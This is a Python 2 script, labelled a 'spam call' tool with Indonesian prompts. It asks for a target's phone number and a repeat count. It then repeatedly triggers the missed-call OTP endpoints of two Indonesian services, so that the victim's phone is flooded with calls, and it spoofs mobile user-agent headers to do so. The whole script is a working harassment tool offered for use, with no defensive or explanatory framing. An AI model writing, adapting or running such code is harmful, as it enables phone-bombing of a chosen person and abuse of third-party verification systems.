import requests, json, os, sys, random
#-------------------------------Warna---------------------------------------------------
qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
#--------------------------------Penkodisian-------------------------------------------
def sukses(no1,pro,nam):
  print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended"%(pu,ku,no1,pu,hi,pu,pu,pro,ku,nam,hi)
def gagal(no1,pro,nam):
  print "     %s[%s%s%s] [%s Failed  %s] %sFailed, spam %s from %s%s %snot sended"%(pu,ku,no1,pu,me,pu,pu,pro,ku,nam,me)
#--------------------------------MAIN---------------------------------------------------
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+62"+nom)
  t = 1
  for spam in range(jum):
   print "%s[%s+%s]-------------------------->>>[%s%s%s]<<<--------------------------[%s+%s]"%(pu,ku,pu,me,t,pu,ku,pu)
   t += 1
   nutriclub();bocil();nutriclub();bocil();nutriclub();bocil();
#--------------------------------Banner/LOGO------------------------------------------
def logo():
  print """%s
  __  __ _  _   _ ____  ____
|  \/  | || | / |___ \/ ___| %sAuthor by %sMars %s
| |\/| | || |_| | __) \___ \%sGithub %sgithub.com/M412S%s
| |  | |__   _| |/ __/ ___) |%sTeam %sDk%s
|_|  |_|  |_| |_|_____|____/
 =======================================%sTools spam call"""%(qu,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
#-------------------------------Input Function------------------------------------------
def input():
  global nom
  nom = raw_input("%s[%s?%s] %sMasukkan nomor target (8888xx) : "%(pu,me,pu,pu))
  if len(nom) < 5:
    print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
    input()
  elif nom.startswith(tuple(["62","+62","0"])):
    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
    jum = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : "%(pu,me,pu,pu)))
    main()
#-------------------------------SPAM Function-------------------------------------------
def nutriclub():
  h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
   sukses("3","call","nutriclub")
  else:
   gagal("3","call","nutriclub")
def bocil():
 dat={'user_id':'','language':'in','phone':'62'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
 uh = requests.post("https://bocil.id/mobile/v1/miscallotp_request.php",headers={'user-agent':'okhttp/3.10.0'},data=dat).text
 if json.loads(uh)["message"] == 'ok':
  sukses("23","call","bocil")
 else:
  gagal("23","call","bocil")


if __name__ == '__main__':
 try:
  os.system("clear")
  logo()
  input()
 except (KeyboardInterrupt,EOFError): print "%s[%s!%s] %sExit"%(pu,me,pu,pu)
 except requests.exceptions.ConnectionError: exit("%s[%s!%s] %sConnection Error..."%(pu,me,pu,me))
